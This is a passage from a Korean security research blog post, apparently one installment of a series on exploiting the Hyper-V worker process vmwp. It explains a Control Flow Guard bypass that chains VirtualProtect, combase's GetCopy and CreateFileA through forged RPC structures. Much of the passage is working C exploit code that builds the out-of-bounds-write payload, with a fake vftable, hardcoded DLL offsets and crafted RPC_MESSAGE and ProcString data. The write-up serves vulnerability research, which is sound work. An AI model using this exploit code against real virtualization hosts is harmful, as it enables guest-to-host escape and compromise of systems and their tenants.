<h3 id="VirtualProtect"><a href="#VirtualProtect" class="headerlink" title="VirtualProtect"></a><code>VirtualProtect</code></h3><p>&#xC815;&#xB9D0; &#xB2E4;&#xD589;&#xD788; <code>VirtualProtect</code>&#xB294; &#xAC04;&#xC811; &#xD638;&#xCD9C;&#xB418;&#xC5B4;&#xB3C4; &#xB418;&#xB294; &#xC720;&#xD6A8;&#xD55C; &#xD568;&#xC218;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; <code>VirtualProtect(rpcrt4!_guard_check_icall_fptr, 8, PAGE_READWRITE, VALID_ADDRESS)</code>&#xC640; &#xAC19;&#xC740; &#xD638;&#xCD9C;&#xC744; &#xBC1C;&#xC0DD;&#xC2DC;&#xCF1C;&#xC11C; &#xBA3C;&#xC800; <code>rpcrt4!__guard_check_icall_fptr</code>&#xC5D0; &#xC4F0;&#xAE30; &#xAD8C;&#xD55C;&#xC744; &#xBD80;&#xC5EC;&#xD569;&#xC2DC;&#xB2E4;</p>
<h3 id="combase-GenericStreamBase-lt-IStream-CoTaskMemAllocAllocator-gt-GetCopy"><a href="#combase-GenericStreamBase-lt-IStream-CoTaskMemAllocAllocator-gt-GetCopy" class="headerlink" title="combase!GenericStreamBase&lt;IStream,CoTaskMemAllocAllocator&gt;::GetCopy"></a><code>combase!GenericStreamBase&lt;IStream,CoTaskMemAllocAllocator&gt;::GetCopy</code></h3><p>&#xC4F0;&#xAE30; &#xAC00;&#xB2A5;&#xD574;&#xC9C4; <code>rpcrt4!__guard_check_icall_fptr</code>&#xC5D0; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC4F0;&#xAE30; &#xC704;&#xD574; &#xC77C;&#xBC18;&#xC801;&#xC778; <code>memcpy</code> &#xB4F1;&#xC744; &#xC4F0;&#xBA74; CFG&#xC5D0; &#xC758;&#xD574; vmwp&#xAC00; &#xC885;&#xB8CC;&#xB418;&#xACE0; &#xB9D9;&#xB2C8;&#xB2E4;&#x2026; &#xB530;&#xB77C;&#xC11C; CFG&#xC5D0; &#xAC78;&#xB9AC;&#xC9C0; &#xC54A;&#xB294; <code>combase!GenericStreamBase&lt;IStream,CoTaskMemAllocAllocator&gt;::GetCopy</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs C">__int64 __fastcall GenericStreamBase&lt;IStream,CoTaskMemAllocAllocator&gt;::GetCopy(GenericStreamBase&lt;IStream,AllocationWrapper&gt; *<span class="hljs-keyword">this</span>, <span class="hljs-keyword">unsigned</span> __int8 *pBuff)
{
  memcpy_0(pBuff, (*&amp;<span class="hljs-keyword">this</span>-&gt;_cbDataSize + <span class="hljs-number">4</span>i64), <span class="hljs-keyword">this</span>-&gt;_lOffset);
  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;
}</code></pre>
<p><img src="/2023/10/30/pwndorei/newjeans-hyper-v-pt5/image6.png" srcset="/img/loading.gif" alt><br>&#xC778;&#xC790;&#xB85C; <code>this</code>&#xC640; &#xB370;&#xC774;&#xD130;&#xAC00; &#xBCF5;&#xC0AC;&#xB420; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xC778; <code>pBuff</code>&#xAC00; &#xBCF4;&#xC774;&#xB294;&#xB370;&#xC694;? <code>this+0x14</code>&#xC758; 4&#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xBCF5;&#xC0AC;&#xD560; &#xB370;&#xC774;&#xD130;&#xC758; &#xBC14;&#xC774;&#xD2B8; &#xC218;, <code>this+0x18</code>&#xC744; 8&#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xBCF5;&#xC0AC;&#xB420; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC704;&#xCE58;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xB85C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. <code>this</code>&#xAC00; &#xC788;&#xC9C4; &#xD558;&#xC9C0;&#xB9CC; &#xC774; &#xB610;&#xD55C; <code>NdrServerCall2</code>&#xB85C; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xB294; &#xC8FC;&#xC18C;&#xC785;&#xB2C8;&#xB2E4;. &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xC5D0; &#xBCF5;&#xC0AC;&#xB420; &#xD06C;&#xAE30;&#xC640; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC704;&#xCE58;&#xD55C; &#xC8FC;&#xC18C;&#xB97C; &#xD3EC;&#xD568;&#xC2DC;&#xD0A4;&#xACE0; &#xC774;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xAC8C; &#xB9CC;&#xB4E4;&#xAE30;&#xB9CC; &#xD558;&#xBA74; &#xB418;&#xC8E0;. &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; <code>memcpy</code>&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xBA70; <code>rpcrt4!__guard_check_icall_fptr</code>&#xC740; &#xD638;&#xCD9C;&#xB418;&#xC790;&#xB9C8;&#xC790; return&#xD558;&#xAC8C; &#xB420; &#xAC81;&#xB2C8;&#xB2E4;. CFG&#xB97C; &#xBC14;&#xBCF4;&#xB85C; &#xB9CC;&#xB4E4;&#xC5B4;&#xBC84;&#xB9AC;&#xB294; &#xAC70;&#xC8E0;!</p>
<h3 id="CreateFileA"><a href="#CreateFileA" class="headerlink" title="CreateFileA"></a><code>CreateFileA</code></h3><p><code>GetCopy</code>&#xB97C; &#xB05D;&#xC73C;&#xB85C; CFG&#xAC00; &#xBB34;&#xB825;&#xD654;&#xB418;&#xC5C8;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC5B4;&#xB5A4; &#xD568;&#xC218;&#xB3C4; &#xD638;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAD73;&#xC774; &#xD568;&#xC218;&#xC77C; &#xD544;&#xC694;&#xB3C4; &#xC5C6;&#xC774; &#xC2E4;&#xD589; &#xAC00;&#xB2A5;&#xD55C; &#xADF8; &#xC5B4;&#xB5A4; &#xC8FC;&#xC18C;&#xB85C;&#xB3C4; &#xC81C;&#xC5B4; &#xD750;&#xB984;&#xC744; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB41C; &#xAC83;&#xC774;&#xC8E0;. &#xD558;&#xC9C0;&#xB9CC; &#xD30C;&#xD2B8; 4&#xC5D0;&#xC11C; &#xC54C;&#xC544;&#xBCF4;&#xC558;&#xB2E4;&#xC2DC;&#xD53C; vmwp&#xB294; &#xC790;&#xC2DD; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC5C6;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>CreateProcess</code>&#xB85C; &#xBA4B;&#xC788;&#xAC8C; &#xACC4;&#xC0B0;&#xAE30;&#xB97C; &#xB744;&#xC6B0;&#xB294; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xBD88;&#xAC00;&#xB2A5;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>C:\Users\Public</code> &#xBC11;&#xC5D0; &#xC544;&#xBB34; &#xD30C;&#xC77C;&#xC774;&#xB098; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xD655;&#xC778;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p>&#xC774;&#xC81C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xCF54;&#xB4DC;&#xC758; &#xD398;&#xC774;&#xB85C;&#xB4DC; &#xBD80;&#xBD84;&#xC744; &#xBCF4;&#xC2DC;&#xC8E0;!</p>
<h1 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h1><p>&#xD398;&#xC774;&#xB85C;&#xB4DC;&#xC758; &#xB300;&#xB7B5;&#xC801;&#xC778; &#xAD6C;&#xC870;&#xB294; &#xC544;&#xB798;&#xC758; &#xADF8;&#xB9BC;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;<br><img src="/2023/10/30/pwndorei/newjeans-hyper-v-pt5/image7.png" srcset="/img/loading.gif" alt><br>&#xBCF4;&#xAE30;&#xB9CC; &#xD574;&#xB3C4; &#xC5B4;&#xC9C8;&#xC5B4;&#xC9C8;&#xD574;&#xC9C0;&#xB294; &#xC800; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xAC00; OOB Write&#xB97C; &#xD1B5;&#xD574; &#xD0C0;&#xAC9F; &#xD799;&#xC5D0;&#xC11C; <code>VideoDirtListener</code>&#xAC00; &#xC704;&#xCE58;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC0BD;&#xC785;&#xB420; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xC758; &#xAC00;&#xC7A5; &#xC55E; &#xBD80;&#xBD84;&#xC5D0; &#xC704;&#xCE58;&#xD55C; &#xB178;&#xB4DC;&#xB4E4;&#xC740; &#xAC01; 0x100 &#xD06C;&#xAE30;&#xB97C; &#xAC00;&#xC9C0;&#xACE0; CFG &#xBB34;&#xB825;&#xD654;&#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xD55C; &#xAC83;&#xCC98;&#xB7FC; &#xAC01; &#xB178;&#xB4DC;&#xB294; <code>RPC_MESSAGE</code>&#xC774;&#xC790; <code>RegistrationStore::Context</code>&#xC785;&#xB2C8;&#xB2E4;. &#xCD94;&#xAC00;&#xB85C; &#xCCAB; &#xBC88;&#xC9F8; &#xB178;&#xB4DC;&#xB294; <code>VideoDirtListener</code>&#xC774;&#xAE30;&#xB3C4; &#xD558;&#xB124;&#xC694;. &#xBB34;&#xD2BC; &#xC800;&#xB294; &#xC774; &#xB178;&#xB4DC;&#xC758; &#xD06C;&#xAE30;&#xB97C; 0x100 &#xBC14;&#xC774;&#xD2B8;&#xB85C; &#xC7A1;&#xACE0; &#xC55E;&#xC758; 0x60&#xBC14;&#xC774;&#xD2B8;&#xB294; <code>RPC_MESSAGE</code>&#xC774;&#xACE0; &#xB098;&#xBA38;&#xC9C0; &#xACF5;&#xAC04;&#xC744; <code>RPC_MESSAGE</code>&#xC758; <code>Buffer</code>&#xB85C; &#xC0AC;&#xC6A9;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.<br>&#xADF8;&#xB7FC; &#xC774;&#xC81C; &#xC81C;&#xAC00; &#xC791;&#xC131;&#xD55C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xC5B4;&#xB5BB;&#xAC8C; &#xB9CC;&#xB4E4;&#xC5C8;&#xB294;&#xC9C0; &#xC0B4;&#xD3B4;&#xBCF4;&#xC2DC;&#xC8E0;!</p>
<h2 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h2><h3 id="Variables"><a href="#Variables" class="headerlink" title="Variables"></a>Variables</h3><pre><code class="hljs C">__int64 rpcrt4_guard_check_icall_fptr = RPCRT4 + <span class="hljs-number">0xe94f0</span>, KernelBase_VirtualProtect = KernelBase + <span class="hljs-number">0x64030</span>, ret = RPCRT4 + <span class="hljs-number">0x58480</span> + <span class="hljs-number">0x1e</span>;<span class="hljs-comment">//RPCRT4!NdrServerCall2 + 0x1e =&gt; ret</span>


<span class="hljs-keyword">char</span>* payload = (<span class="hljs-keyword">char</span>*)VideoDirtListenerOffset;
PRPC_MESSAGE pRpcMsg = <span class="hljs-literal">NULL</span>;
PRPC_SERVER_INTERFACE pServerInterface = <span class="hljs-literal">NULL</span>;
PMIDL_SERVER_INFO pMidl = <span class="hljs-literal">NULL</span>;
__int64* node = <span class="hljs-literal">NULL</span>;

__int64 start = VideoDirtListener, DispatchTable = start + <span class="hljs-number">0x100</span> * INDIRECT_CALL_CHAIN_LEN, MidlStubDesc = DispatchTable + <span class="hljs-keyword">sizeof</span>(__int64) * INDIRECT_CALL_CHAIN_LEN, MidlSrvInfo = MidlStubDesc + <span class="hljs-keyword">sizeof</span>(MIDL_STUB_DESC), ServerInterface = MidlSrvInfo + <span class="hljs-keyword">sizeof</span>(MIDL_SERVER_INFO);
__int64 ProcStringAddress = ServerInterface + <span class="hljs-keyword">sizeof</span>(RPC_SERVER_INTERFACE), FmtStringOffsetAddress = ProcStringAddress + <span class="hljs-number">0x100</span>, vftable = FmtStringOffsetAddress + <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">short</span>) * <span class="hljs-number">0x10</span>;
<span class="hljs-keyword">char</span>* ProcString = ((<span class="hljs-keyword">char</span>*)VideoDirtListenerOffset) + (ProcStringAddress - start);
<span class="hljs-keyword">int</span> ProcStringCursor = <span class="hljs-number">0</span>;
WORD* FmtStringOffset = ((<span class="hljs-keyword">char</span>*)VideoDirtListenerOffset) + (FmtStringOffsetAddress - start);
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; INDIRECT_CALL_CHAIN_LEN; i++) {
	FmtStringOffset[i] = <span class="hljs-number">0</span>;
}</code></pre>
<p>&#xD544;&#xC694;&#xD55C; &#xBCC0;&#xC218;&#xB4E4;&#xC744; &#xCD08;&#xAE30;&#xD654;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC785;&#xB2C8;&#xB2E4;. &#xD0C0;&#xAC9F; &#xD799;&#xC5D0;&#xC11C; &#xC720;&#xCD9C;&#xD55C; DLL &#xC8FC;&#xC18C;&#xB85C; <code>rpcrt4!__guard_check_icall_fptr</code>, <code>VirtualProtect</code> &#xB4F1;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xBCC0;&#xC218;&#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. <code>start</code>, <code>DispatchTable</code> &#xB4F1; &#xC815;&#xC218;&#xD615; &#xBCC0;&#xC218;&#xB4E4;&#xC740; vmwp&#xC758; &#xAC00;&#xC0C1; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC544;&#xAE4C; &#xC704;&#xC5D0;&#xC11C; &#xBCF8; &#xD398;&#xC774;&#xB85C;&#xB4DC; &#xAD6C;&#xC870;&#xC5D0;&#xC11C; &#xC54C; &#xC218; &#xC788;&#xB4EF;&#xC774; &#xD398;&#xC774;&#xB85C;&#xB4DC; &#xC548;&#xC5D0;&#xC11C; &#xB2E4;&#xC591;&#xD55C; &#xAD6C;&#xC870;&#xCCB4;&#xB4E4;&#xC774; &#xC11C;&#xB85C;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xACE0; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xBBF8;&#xB9AC; &#xD574;&#xB2F9; &#xC8FC;&#xC18C;&#xB97C; &#xACC4;&#xC0B0;&#xD574;&#xB450;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8; &#xC678;&#xC5D0; &#xD3EC;&#xC778;&#xD130; &#xBCC0;&#xC218;&#xB4E4;&#xC740; vmwp&#xAC00; &#xC544;&#xB2CC; Exploit &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xC11C; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xC5D0; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC4F8; &#xB54C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p>
<h3 id="vftable"><a href="#vftable" class="headerlink" title="vftable"></a>vftable</h3><pre><code class="hljs C">VideoDirtListenerEntries[<span class="hljs-number">2</span>] = combase + <span class="hljs-number">0x17d9b0</span>;<span class="hljs-comment">//vmemulateddevices!VideoDirtListener::PrepareSelf -&gt; combase!RegistrationStore::Context::RevertChanges</span>
VideoDirtListenerEntries[<span class="hljs-number">0x70</span> / <span class="hljs-number">0x8</span>] = RPCRT4 + <span class="hljs-number">0x58480</span>;<span class="hljs-comment">//RPCRT4!NdrServerCall2</span>
VideoDirtListenerEntries[<span class="hljs-number">0</span>] = DispatchTable + <span class="hljs-number">8</span> - <span class="hljs-number">0x70</span>;<span class="hljs-comment">// -&gt; RPCRT4!NdrpServerUnmarshal&apos;s indirect call must return 0, point to VirtualProtect &amp; make it fail to return 0</span>
VideoDirtListenerEntries[<span class="hljs-number">1</span>] = <span class="hljs-number">0x33307c89abcdef</span>;<span class="hljs-comment">//NdrStubCall2+0x4c0</span></code></pre>
<p><code>VideoDirtlistenerEntries</code>&#xB294; <code>VideoDirtListener</code>&#xC758; vftable&#xC758; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAC04;&#xC811; &#xD638;&#xCD9C;&#xC744; &#xBC18;&#xBCF5;&#xD558;&#xAE30; &#xC704;&#xD574; <code>VideoDirtListener::PrepareSelf</code>&#xB97C; <code>combase!RegistrationStore:Context:RevertChanges</code>&#xB85C; &#xBC14;&#xAFD4;&#xC8FC;&#xACE0; <code>RevertChanges</code>&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xB420; &#xD568;&#xC218;&#xB294; <code>NdrServerCall2</code>&#xB85C; &#xC870;&#xC791;&#xD574;&#xB450;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; <code>NdrStubCall2</code>&#xC640; <code>NdrpServerUnMarshal</code>&#xC5D0;&#xC11C; <code>RpcRaiseException</code>&#xC774; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xAC83;&#xC744; &#xB9C9;&#xAE30; &#xC704;&#xD574; 0&#xBC88;&#xC9F8;, 1&#xBC88;&#xC9F8; &#xC5D4;&#xD2B8;&#xB9AC;&#xB97C; &#xC218;&#xC815;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<h3 id="ProcDesc-amp-ProcString"><a href="#ProcDesc-amp-ProcString" class="headerlink" title="ProcDesc &amp; ProcString"></a>ProcDesc &amp; ProcString</h3><p><code>NdrServerCall2</code>&#xC5D0;&#xC11C; &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC5D0; &#xD544;&#xC694;&#xD55C; &#xC778;&#xC790;&#xB97C; Unmarshaling&#xD558;&#xB294;&#xB370; &#xD544;&#xC694;&#xD55C; ProcString&#xACFC; ProcDesc&#xB3C4; &#xC798; &#xC124;&#xC815;&#xD574;&#xC918;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xCCAB; &#xBC88;&#xC9F8; &#xB178;&#xB4DC;(<code>VideoDirtListener</code>)&#xB294; &#xB8E8;&#xD504;&#xB97C; &#xC2DC;&#xC791;&#xD558;&#xAE30; &#xC704;&#xD574; <code>RevertChanges</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xC5ED;&#xD560;&#xB9CC; &#xD558;&#xACE0; &#xB450; &#xBC88;&#xC9F8; &#xB178;&#xB4DC;&#xBD80;&#xD130; &#xCC28;&#xB840;&#xB85C; <code>VirtualProtect</code>, <code>GetCopy</code>, <code>CreateFileA</code>&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC778;&#xC790;&#xC758; &#xC218;&#xB294; &#xC774;&#xBBF8; &#xC815;&#xD574;&#xC838; &#xC788;&#xC73C;&#xB2C8; &#xC774;&#xC5D0; &#xB9DE;&#xCDB0; ProcString&#xACFC; ProcDesc&#xB97C; &#xCD08;&#xAE30;&#xD654;&#xD569;&#xB2C8;&#xB2E4;. &#xBC18;&#xBCF5;&#xBB38;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB41C; i&#xB294; ProcNum&#xC774;&#xC790; &#xB178;&#xB4DC;&#xC758; &#xBC88;&#xD638;&#xC785;&#xB2C8;&#xB2E4;.<br>&#xADF8; &#xC678;&#xC5D0; vftable &#xC8FC;&#xC18C;&#xB97C; &#xBCC0;&#xACBD;&#xD558;&#xACE0; <code>RevertChanges</code>&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB420; <code>Blink</code>&#xB97C; &#xB2E4;&#xC74C; &#xB178;&#xB4DC;&#xC758; &#xC8FC;&#xC18C;&#xB85C; &#xC124;&#xC815;&#xD558;&#xACE0; <code>RPC_MESSAGE</code>&#xC758; &#xD544;&#xB4DC;&#xB4E4;&#xB3C4; &#xC124;&#xC815;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.<br>&#xC774;&#xD6C4; switch-case&#xB85C; i&#xC5D0; &#xB530;&#xB77C; <code>BufferLength</code>, <code>NumberParams</code>, <code>StackSize</code> &#xB4F1;&#xC744; &#xC124;&#xC815;&#xD558;&#xACE0; &#xC774;&#xD6C4; <code>NumberParams</code>&#xAC1C;&#xC758; <code>Param</code>&#xC744; &#xCD08;&#xAE30;&#xD654;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs C"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; INDIRECT_CALL_CHAIN_LEN; i++) {
	<span class="hljs-keyword">char</span>* ProcDesc = <span class="hljs-literal">NULL</span>;
	WORD* Param = <span class="hljs-literal">NULL</span>;
	node = payload + i * <span class="hljs-number">0x100</span>;
	node[<span class="hljs-number">0</span>] = vftable;
	node[<span class="hljs-number">0x58</span> / <span class="hljs-number">8</span>] = start + (i + <span class="hljs-number">1</span>) * <span class="hljs-number">0x100</span> + <span class="hljs-number">0x50</span>;
	pRpcMsg = payload + i * <span class="hljs-number">0x100</span>;
	pRpcMsg-&gt;Buffer = start + i * <span class="hljs-number">0x100</span> + <span class="hljs-number">0x60</span>;
	pRpcMsg-&gt;ProcNum = i;
	pRpcMsg-&gt;RpcInterfaceInformation = ServerInterface;
	pRpcMsg-&gt;DataRepresentation = <span class="hljs-number">0x10</span>;
	FmtStringOffset[i] = ProcStringCursor;

	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Node[%x]: address=%llx, vftable=%llx, Buffer=%llx, RPC_SERVER_INTERFACE=%llx, next=%llx\n&quot;</span>, i, start+i*<span class="hljs-number">0x100</span>, vftable, start+i*<span class="hljs-number">0x100</span>+<span class="hljs-number">0x60</span>, ServerInterface, start + (i+<span class="hljs-number">1</span>)*<span class="hljs-number">0x100</span>+<span class="hljs-number">0x50</span>);

	ProcString[ProcStringCursor + <span class="hljs-number">0</span>] = <span class="hljs-number">0x1</span>;<span class="hljs-comment">//HandleType = 0x1</span>
	ProcString[ProcStringCursor + <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<span class="hljs-comment">//InterpreterFlags = 0</span>
	*(<span class="hljs-keyword">short</span>*)&amp;ProcString[ProcStringCursor + <span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<span class="hljs-comment">// return value == 0</span>
	<span class="hljs-keyword">switch</span> (i) {<span class="hljs-comment">//i=&gt;ProcNum,  StackSize = BufferLength, Buffer + Bufferlen =&gt; ProcDesc</span>
	<span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<span class="hljs-comment">//VirtualProtect(RPCRT4!_guard_check_icall_fptr, 8, PAGE_READWRITE, VALID_ADDRESS)</span>
		*(<span class="hljs-keyword">short</span>*)&amp;ProcString[ProcStringCursor + <span class="hljs-number">4</span>] = <span class="hljs-number">0x20</span>;<span class="hljs-comment">//StackSize &lt;- Buffer Length</span>
		pRpcMsg-&gt;BufferLength = <span class="hljs-number">0x20</span>;
		<span class="hljs-comment">//*(__int64*)&amp;ProcString[0x10 * i + 6] = start + i * 0x100 + 0x60 + 0x20 + 0x10;//0x20 -&gt; bufferlen, ProcDesc Pointer</span>
		<span class="hljs-comment">//ProcDesc = &amp;pRpcMsg-&gt;Buffer + 0x30;//after ProcDescPointer</span>
		ProcDesc = &amp;ProcString[ProcStringCursor + <span class="hljs-number">6</span>];
		ProcDesc[<span class="hljs-number">4</span>] = <span class="hljs-number">0</span>;<span class="hljs-comment">//ignore return value</span>
		ProcDesc[<span class="hljs-number">5</span>] = pRpcMsg-&gt;BufferLength/<span class="hljs-number">4</span>;<span class="hljs-comment">//NumberParams</span>
		Param = ProcDesc + <span class="hljs-number">6</span>;
		ProcStringCursor += <span class="hljs-number">6</span> + <span class="hljs-number">6</span>;<span class="hljs-comment">//ProcString + ProcDesc len</span>
		<span class="hljs-keyword">break</span>;

	<span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<span class="hljs-comment">//GetCopy(this, dest)</span>
		*(<span class="hljs-keyword">short</span>*)&amp;ProcString[ProcStringCursor + <span class="hljs-number">4</span>] = <span class="hljs-number">0x10</span>;<span class="hljs-comment">//StackSize &lt;- Buffer Length</span>
		pRpcMsg-&gt;BufferLength = <span class="hljs-number">0x10</span>;
		ProcDesc = &amp;ProcString[ProcStringCursor + <span class="hljs-number">6</span>];
		ProcDesc[<span class="hljs-number">4</span>] = <span class="hljs-number">0</span>;<span class="hljs-comment">//ignore return value</span>
		ProcDesc[<span class="hljs-number">5</span>] = pRpcMsg-&gt;BufferLength/<span class="hljs-number">4</span>;<span class="hljs-comment">//NumberParams</span>
		Param = ProcDesc + <span class="hljs-number">6</span>;
		ProcStringCursor += <span class="hljs-number">6</span> + <span class="hljs-number">6</span>;<span class="hljs-comment">//ProcString + ProcDesc len</span>
		<span class="hljs-keyword">break</span>;

	<span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<span class="hljs-comment">//CreateFileA</span>
		*(<span class="hljs-keyword">short</span>*)&amp;ProcString[ProcStringCursor + <span class="hljs-number">4</span>] = <span class="hljs-number">0x8</span> * <span class="hljs-number">7</span>;<span class="hljs-comment">//StackSize &lt;- Buffer Length</span>
		pRpcMsg-&gt;BufferLength = <span class="hljs-number">0x8</span> * <span class="hljs-number">7</span>;
		ProcDesc = &amp;ProcString[ProcStringCursor + <span class="hljs-number">6</span>];
		ProcDesc[<span class="hljs-number">4</span>] = <span class="hljs-number">0</span>;<span class="hljs-comment">//ignore return value</span>
		ProcDesc[<span class="hljs-number">5</span>] = pRpcMsg-&gt;BufferLength/<span class="hljs-number">4</span>;<span class="hljs-comment">//NumberParams</span>
		Param = ProcDesc + <span class="hljs-number">6</span>;
		ProcStringCursor += <span class="hljs-number">6</span> + <span class="hljs-number">6</span>;<span class="hljs-comment">//ProcString + ProcDesc len</span>
		<span class="hljs-keyword">break</span>;

	<span class="hljs-keyword">default</span>:
		<span class="hljs-keyword">break</span>;
	}
	<span class="hljs-keyword">if</span> (Param &amp;&amp; ProcDesc &amp;&amp; pRpcMsg-&gt;BufferLength) {<span class="hljs-comment">//ProcDesc is Not NULL and StackSize is bigger than 0 =&gt; have parameter</span>
		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\t[+] Param Info: Num of param=%d, StackSize=0x%x, \n&quot;</span>, ProcDesc[<span class="hljs-number">5</span>], pRpcMsg-&gt;BufferLength);
		*(__int64*)&amp;ProcDesc[<span class="hljs-number">6</span>] = (__int64)pRpcMsg-&gt;Buffer + <span class="hljs-number">0x10</span> + *(<span class="hljs-keyword">short</span>*)&amp;ProcString[<span class="hljs-number">0x10</span> * i + <span class="hljs-number">4</span>];<span class="hljs-comment">//address of buffer + bufferlen+ ProcDescLen</span>
		<span class="hljs-comment">//Param = (char*)&amp;(pRpcMsg-&gt;Buffer) + 0x20 + *(short*)&amp;ProcString[0x10 * i + 4];</span>
		<span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; pRpcMsg-&gt;BufferLength / <span class="hljs-number">0x4</span>; j++) {
			Param[j * <span class="hljs-number">3</span>] = <span class="hljs-number">0x8</span> | <span class="hljs-number">0x40</span>;<span class="hljs-comment">//flag, used in Unmarshaling</span>
			Param[j * <span class="hljs-number">3</span> + <span class="hljs-number">1</span>] = j * <span class="hljs-number">4</span>;<span class="hljs-comment">//Stack Index of parameter</span>
			Param[j * <span class="hljs-number">3</span> + <span class="hljs-number">2</span>] = <span class="hljs-number">8</span>;<span class="hljs-comment">//Size of Param</span>
			ProcStringCursor += <span class="hljs-number">6</span>;<span class="hljs-comment">//add params len</span>
		}
	}
	<span class="hljs-keyword">else</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\t[+] Param Info: No param\n&quot;</span>);

}</code></pre>
